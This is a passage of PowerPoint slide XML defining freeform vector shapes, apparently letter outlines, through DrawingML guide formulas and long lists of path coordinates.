                  <a:gd name="T37" fmla="*/ 104 h 174"/>
                  <a:gd name="T38" fmla="*/ 177 w 185"/>
                  <a:gd name="T39" fmla="*/ 121 h 174"/>
                  <a:gd name="T40" fmla="*/ 169 w 185"/>
                  <a:gd name="T41" fmla="*/ 136 h 174"/>
                  <a:gd name="T42" fmla="*/ 160 w 185"/>
                  <a:gd name="T43" fmla="*/ 146 h 174"/>
                  <a:gd name="T44" fmla="*/ 143 w 185"/>
                  <a:gd name="T45" fmla="*/ 159 h 174"/>
                  <a:gd name="T46" fmla="*/ 124 w 185"/>
                  <a:gd name="T47" fmla="*/ 167 h 174"/>
                  <a:gd name="T48" fmla="*/ 99 w 185"/>
                  <a:gd name="T49" fmla="*/ 172 h 174"/>
                  <a:gd name="T50" fmla="*/ 85 w 185"/>
                  <a:gd name="T51" fmla="*/ 174 h 174"/>
                  <a:gd name="T52" fmla="*/ 58 w 185"/>
                  <a:gd name="T53" fmla="*/ 172 h 174"/>
                  <a:gd name="T54" fmla="*/ 36 w 185"/>
                  <a:gd name="T55" fmla="*/ 171 h 174"/>
                  <a:gd name="T56" fmla="*/ 23 w 185"/>
                  <a:gd name="T57" fmla="*/ 171 h 174"/>
                  <a:gd name="T58" fmla="*/ 8 w 185"/>
                  <a:gd name="T59" fmla="*/ 171 h 174"/>
                  <a:gd name="T60" fmla="*/ 3 w 185"/>
                  <a:gd name="T61" fmla="*/ 169 h 174"/>
                  <a:gd name="T62" fmla="*/ 4 w 185"/>
                  <a:gd name="T63" fmla="*/ 167 h 174"/>
                  <a:gd name="T64" fmla="*/ 7 w 185"/>
                  <a:gd name="T65" fmla="*/ 167 h 174"/>
                  <a:gd name="T66" fmla="*/ 15 w 185"/>
                  <a:gd name="T67" fmla="*/ 166 h 174"/>
                  <a:gd name="T68" fmla="*/ 20 w 185"/>
                  <a:gd name="T69" fmla="*/ 162 h 174"/>
                  <a:gd name="T70" fmla="*/ 21 w 185"/>
                  <a:gd name="T71" fmla="*/ 154 h 174"/>
                  <a:gd name="T72" fmla="*/ 23 w 185"/>
                  <a:gd name="T73" fmla="*/ 105 h 174"/>
                  <a:gd name="T74" fmla="*/ 50 w 185"/>
                  <a:gd name="T75" fmla="*/ 91 h 174"/>
                  <a:gd name="T76" fmla="*/ 52 w 185"/>
                  <a:gd name="T77" fmla="*/ 137 h 174"/>
                  <a:gd name="T78" fmla="*/ 52 w 185"/>
                  <a:gd name="T79" fmla="*/ 146 h 174"/>
                  <a:gd name="T80" fmla="*/ 54 w 185"/>
                  <a:gd name="T81" fmla="*/ 154 h 174"/>
                  <a:gd name="T82" fmla="*/ 57 w 185"/>
                  <a:gd name="T83" fmla="*/ 157 h 174"/>
                  <a:gd name="T84" fmla="*/ 71 w 185"/>
                  <a:gd name="T85" fmla="*/ 162 h 174"/>
                  <a:gd name="T86" fmla="*/ 83 w 185"/>
                  <a:gd name="T87" fmla="*/ 162 h 174"/>
                  <a:gd name="T88" fmla="*/ 114 w 185"/>
                  <a:gd name="T89" fmla="*/ 159 h 174"/>
                  <a:gd name="T90" fmla="*/ 136 w 185"/>
                  <a:gd name="T91" fmla="*/ 146 h 174"/>
                  <a:gd name="T92" fmla="*/ 141 w 185"/>
                  <a:gd name="T93" fmla="*/ 141 h 174"/>
                  <a:gd name="T94" fmla="*/ 148 w 185"/>
                  <a:gd name="T95" fmla="*/ 129 h 174"/>
                  <a:gd name="T96" fmla="*/ 153 w 185"/>
                  <a:gd name="T97" fmla="*/ 107 h 174"/>
                  <a:gd name="T98" fmla="*/ 154 w 185"/>
                  <a:gd name="T99" fmla="*/ 90 h 174"/>
                  <a:gd name="T100" fmla="*/ 153 w 185"/>
                  <a:gd name="T101" fmla="*/ 70 h 174"/>
                  <a:gd name="T102" fmla="*/ 148 w 185"/>
                  <a:gd name="T103" fmla="*/ 54 h 174"/>
                  <a:gd name="T104" fmla="*/ 133 w 185"/>
                  <a:gd name="T105" fmla="*/ 33 h 174"/>
                  <a:gd name="T106" fmla="*/ 125 w 185"/>
                  <a:gd name="T107" fmla="*/ 26 h 174"/>
                  <a:gd name="T108" fmla="*/ 108 w 185"/>
                  <a:gd name="T109" fmla="*/ 17 h 174"/>
                  <a:gd name="T110" fmla="*/ 83 w 185"/>
                  <a:gd name="T111" fmla="*/ 12 h 174"/>
                  <a:gd name="T112" fmla="*/ 69 w 185"/>
                  <a:gd name="T113" fmla="*/ 10 h 174"/>
                  <a:gd name="T114" fmla="*/ 54 w 185"/>
                  <a:gd name="T115" fmla="*/ 12 h 174"/>
                  <a:gd name="T116" fmla="*/ 52 w 185"/>
                  <a:gd name="T117" fmla="*/ 14 h 174"/>
                  <a:gd name="T118" fmla="*/ 52 w 185"/>
                  <a:gd name="T119" fmla="*/ 17 h 174"/>
                  <a:gd name="T120" fmla="*/ 50 w 185"/>
                  <a:gd name="T121" fmla="*/ 91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85" h="174">
                    <a:moveTo>
                      <a:pt x="23" y="66"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="66"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17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37" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="73" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="73" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="107" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="119" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="143" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="164" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="164" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="172" y="36"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="178" y="49"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="181" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="183" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="185" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="185" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="185" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="185" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="183" y="104"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="181" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="177" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="174" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="169" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="155"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="143" y="159"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="163"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="167"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="85" y="174"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="85" y="174"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="171"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="167"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="167"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="167"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="165"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="162"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="154"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="154"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="105"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="66"/>
                    </a:lnTo>
                    <a:close/>
                    <a:moveTo>
                      <a:pt x="50" y="91"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="50" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="154"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="154"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="157"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="64" y="159"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="162"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="162"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="162"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="162"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="159"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="125" y="154"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="141" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="148" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="107"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="154" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="154" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="154" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="70"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="148" y="54"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="140" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="33"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="33"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="125" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="69" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="69" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="9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8" name="Freeform 149">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34AAA637-0D54-4DCB-9127-94B00F36A887}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4876418" y="2357718"/>
                <a:ext cx="90191" cy="126266"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 20 w 105"/>
                  <a:gd name="T1" fmla="*/ 17 h 147"/>
                  <a:gd name="T2" fmla="*/ 18 w 105"/>
                  <a:gd name="T3" fmla="*/ 9 h 147"/>
                  <a:gd name="T4" fmla="*/ 12 w 105"/>
                  <a:gd name="T5" fmla="*/ 6 h 147"/>
                  <a:gd name="T6" fmla="*/ 1 w 105"/>
                  <a:gd name="T7" fmla="*/ 5 h 147"/>
                  <a:gd name="T8" fmla="*/ 1 w 105"/>
                  <a:gd name="T9" fmla="*/ 2 h 147"/>
                  <a:gd name="T10" fmla="*/ 33 w 105"/>
                  <a:gd name="T11" fmla="*/ 2 h 147"/>
                  <a:gd name="T12" fmla="*/ 88 w 105"/>
                  <a:gd name="T13" fmla="*/ 2 h 147"/>
                  <a:gd name="T14" fmla="*/ 99 w 105"/>
                  <a:gd name="T15" fmla="*/ 0 h 147"/>
                  <a:gd name="T16" fmla="*/ 100 w 105"/>
                  <a:gd name="T17" fmla="*/ 2 h 147"/>
                  <a:gd name="T18" fmla="*/ 99 w 105"/>
                  <a:gd name="T19" fmla="*/ 14 h 147"/>
                  <a:gd name="T20" fmla="*/ 97 w 105"/>
                  <a:gd name="T21" fmla="*/ 27 h 147"/>
                  <a:gd name="T22" fmla="*/ 96 w 105"/>
                  <a:gd name="T23" fmla="*/ 30 h 147"/>
                  <a:gd name="T24" fmla="*/ 93 w 105"/>
                  <a:gd name="T25" fmla="*/ 27 h 147"/>
                  <a:gd name="T26" fmla="*/ 92 w 105"/>
                  <a:gd name="T27" fmla="*/ 21 h 147"/>
                  <a:gd name="T28" fmla="*/ 86 w 105"/>
                  <a:gd name="T29" fmla="*/ 14 h 147"/>
                  <a:gd name="T30" fmla="*/ 49 w 105"/>
                  <a:gd name="T31" fmla="*/ 13 h 147"/>
                  <a:gd name="T32" fmla="*/ 47 w 105"/>
                  <a:gd name="T33" fmla="*/ 14 h 147"/>
                  <a:gd name="T34" fmla="*/ 47 w 105"/>
                  <a:gd name="T35" fmla="*/ 63 h 147"/>
                  <a:gd name="T36" fmla="*/ 83 w 105"/>
                  <a:gd name="T37" fmla="*/ 64 h 147"/>
                  <a:gd name="T38" fmla="*/ 92 w 105"/>
                  <a:gd name="T39" fmla="*/ 60 h 147"/>
                  <a:gd name="T40" fmla="*/ 96 w 105"/>
                  <a:gd name="T41" fmla="*/ 58 h 147"/>
                  <a:gd name="T42" fmla="*/ 97 w 105"/>
                  <a:gd name="T43" fmla="*/ 60 h 147"/>
                  <a:gd name="T44" fmla="*/ 96 w 105"/>
                  <a:gd name="T45" fmla="*/ 75 h 147"/>
                  <a:gd name="T46" fmla="*/ 95 w 105"/>
                  <a:gd name="T47" fmla="*/ 91 h 147"/>
                  <a:gd name="T48" fmla="*/ 93 w 105"/>
                  <a:gd name="T49" fmla="*/ 92 h 147"/>
                  <a:gd name="T50" fmla="*/ 91 w 105"/>
                  <a:gd name="T51" fmla="*/ 91 h 147"/>
                  <a:gd name="T52" fmla="*/ 90 w 105"/>
                  <a:gd name="T53" fmla="*/ 80 h 147"/>
                  <a:gd name="T54" fmla="*/ 79 w 105"/>
                  <a:gd name="T55" fmla="*/ 75 h 147"/>
                  <a:gd name="T56" fmla="*/ 49 w 105"/>
                  <a:gd name="T57" fmla="*/ 75 h 147"/>
                  <a:gd name="T58" fmla="*/ 47 w 105"/>
                  <a:gd name="T59" fmla="*/ 92 h 147"/>
                  <a:gd name="T60" fmla="*/ 47 w 105"/>
                  <a:gd name="T61" fmla="*/ 121 h 147"/>
                  <a:gd name="T62" fmla="*/ 50 w 105"/>
                  <a:gd name="T63" fmla="*/ 131 h 147"/>
                  <a:gd name="T64" fmla="*/ 61 w 105"/>
                  <a:gd name="T65" fmla="*/ 135 h 147"/>
                  <a:gd name="T66" fmla="*/ 83 w 105"/>
                  <a:gd name="T67" fmla="*/ 137 h 147"/>
                  <a:gd name="T68" fmla="*/ 92 w 105"/>
                  <a:gd name="T69" fmla="*/ 134 h 147"/>
                  <a:gd name="T70" fmla="*/ 100 w 105"/>
                  <a:gd name="T71" fmla="*/ 125 h 147"/>
                  <a:gd name="T72" fmla="*/ 103 w 105"/>
                  <a:gd name="T73" fmla="*/ 118 h 147"/>
                  <a:gd name="T74" fmla="*/ 104 w 105"/>
                  <a:gd name="T75" fmla="*/ 117 h 147"/>
                  <a:gd name="T76" fmla="*/ 105 w 105"/>
                  <a:gd name="T77" fmla="*/ 121 h 147"/>
                  <a:gd name="T78" fmla="*/ 103 w 105"/>
                  <a:gd name="T79" fmla="*/ 143 h 147"/>
                  <a:gd name="T80" fmla="*/ 92 w 105"/>
                  <a:gd name="T81" fmla="*/ 147 h 147"/>
                  <a:gd name="T82" fmla="*/ 55 w 105"/>
                  <a:gd name="T83" fmla="*/ 147 h 147"/>
                  <a:gd name="T84" fmla="*/ 21 w 105"/>
                  <a:gd name="T85" fmla="*/ 147 h 147"/>
                  <a:gd name="T86" fmla="*/ 7 w 105"/>
                  <a:gd name="T87" fmla="*/ 147 h 147"/>
                  <a:gd name="T88" fmla="*/ 4 w 105"/>
                  <a:gd name="T89" fmla="*/ 145 h 147"/>
                  <a:gd name="T90" fmla="*/ 7 w 105"/>
                  <a:gd name="T91" fmla="*/ 143 h 147"/>
                  <a:gd name="T92" fmla="*/ 16 w 105"/>
                  <a:gd name="T93" fmla="*/ 142 h 147"/>
                  <a:gd name="T94" fmla="*/ 20 w 105"/>
                  <a:gd name="T95" fmla="*/ 133 h 147"/>
                  <a:gd name="T96" fmla="*/ 20 w 105"/>
                  <a:gd name="T97" fmla="*/ 58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05" h="147">
                    <a:moveTo>
                      <a:pt x="20" y="58"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="20" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16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1" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="1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88" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="62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9" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="63"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="59"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="59"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="80"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="125"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="125"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="143"/>
